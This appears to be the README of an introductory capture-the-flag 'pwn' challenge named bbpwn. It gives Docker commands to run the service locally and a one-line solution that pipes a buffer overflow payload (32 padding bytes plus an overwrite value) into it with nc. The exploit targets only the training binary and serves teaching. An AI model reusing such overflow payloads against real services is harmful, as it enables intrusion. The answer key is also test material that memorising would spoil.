# bbpwn
Intro pwn challenge.

# Setup

sudo docker build -t bbpwn .
sudo docker run --rm -it -p 4252:4252 bbpwn

# Solution 
python -c "print 'A' * 32 + '\xef\xbe\x37\x13'" | nc localhost 4252
